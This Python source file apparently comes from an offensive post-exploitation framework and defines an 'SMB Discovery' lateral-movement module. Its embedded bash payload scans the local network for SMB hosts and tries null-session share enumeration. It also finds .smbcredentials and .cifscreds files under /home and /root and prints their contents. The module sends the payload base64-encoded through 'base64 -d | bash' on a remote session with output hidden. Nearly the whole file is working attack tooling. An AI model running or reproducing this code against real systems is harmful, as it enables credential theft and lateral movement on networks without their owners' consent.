"""SMB share discovery script."""

from ..base import OperatorScript, ScriptResult


class SMBDiscovery(OperatorScript):
    """Discover and enumerate SMB shares on the network."""
    
    name = "SMB Discovery"
    description = "Discover and enumerate SMB shares on the network"
    category = "lateral"
    
    def get_payload(self) -> str:
        return """#!/bin/bash
echo "[*] SMB SHARE DISCOVERY"
echo "======================"
echo ""

echo "[+] Checking for SMB tools:"
command -v smbclient &>/dev/null && echo "[+] smbclient available" || echo "[-] smbclient not found"
command -v enum4linux &>/dev/null && echo "[+] enum4linux available" || echo "[-] enum4linux not found"
command -v nmap &>/dev/null && echo "[+] nmap available" || echo "[-] nmap not found"
echo ""

echo "[+] Discovering SMB hosts on local network:"
LOCAL_NET=$(ip route | grep default | awk '{print $3}' | cut -d. -f1-3).0/24
if command -v nmap &>/dev/null; then
    echo "[*] Scanning $LOCAL_NET for SMB (port 445)"
    nmap -p 445 --open -T4 $LOCAL_NET 2>/dev/null | grep "Nmap scan\|445"
else
    echo "[-] nmap not available, using manual scan"
    LOCAL_NET_BASE=$(ip route | grep default | awk '{print $3}' | cut -d. -f1-3)
    for i in {1..10}; do
        timeout 1 bash -c "echo >/dev/tcp/$LOCAL_NET_BASE.$i/445" 2>/dev/null && \
            echo "[+] $LOCAL_NET_BASE.$i:445 OPEN"
    done
fi
echo ""

echo "[+] Enumerating localhost SMB shares:"
if command -v smbclient &>/dev/null; then
    smbclient -L localhost -N 2>/dev/null
    echo ""
    echo "[*] Attempting null session enumeration:"
    smbclient -L localhost -U "" -N 2>/dev/null
else
    echo "[-] smbclient not available"
fi
echo ""

echo "[+] Checking for SMB credentials in common locations:"
find /home /root -name ".smbcredentials" -o -name ".cifscreds" 2>/dev/null | while read file; do
    echo "[!] Found: $file"
    cat "$file" 2>/dev/null
done
echo ""

echo "[+] Searching for recent SMB connections in logs:"
grep -r "smb\|cifs" /var/log 2>/dev/null | tail -20
echo ""

if command -v enum4linux &>/dev/null; then
    echo "[*] Running enum4linux on localhost:"
    timeout 30 enum4linux -a localhost 2>/dev/null
fi
"""
    
    def run(self, session_meta, send_command_func, output_func) -> ScriptResult:
        try:
            output_func("[bold cyan][*] Discovering SMB shares...[/bold cyan]")
            
            payload = self.get_payload()
            import base64
            encoded = base64.b64encode(payload.encode()).decode('ascii')
            send_command_func(f"echo '{encoded}' | base64 -d | bash", show_in_output=False)
            
            return ScriptResult(
                success=True,
                output="SMB discovery executed",
                metadata={"script": "smb_discovery"}
            )
        except Exception as e:
            return ScriptResult(success=False, output="", error=str(e))
